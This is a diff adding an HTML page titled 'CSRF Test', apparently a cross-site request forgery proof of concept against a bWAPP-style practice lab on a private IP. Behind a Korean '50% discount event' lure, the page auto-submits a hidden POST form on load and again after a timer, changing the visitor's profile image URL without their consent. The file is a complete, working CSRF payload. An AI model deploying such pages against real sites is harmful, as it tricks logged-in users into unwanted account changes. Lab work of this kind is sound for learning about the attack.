@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <h1>🔥 한정 할인 이벤트! 50% 할인 중! 🔥</h1>
+    <p></p>
+
+    <form action="http://10.95.102.64:3000/profile" method="POST">
+        <input type="hidden" name="imageurl" value="http://10.95.102.64/bWAPP/images/bee_1.png"/>
+        <input type="submit"/>
+    </form>
+
+    <script>
+        setTimeout(() => {
+            document.forms[0].submit();
+        }, 1000);     </script>
+</body>
+</html>
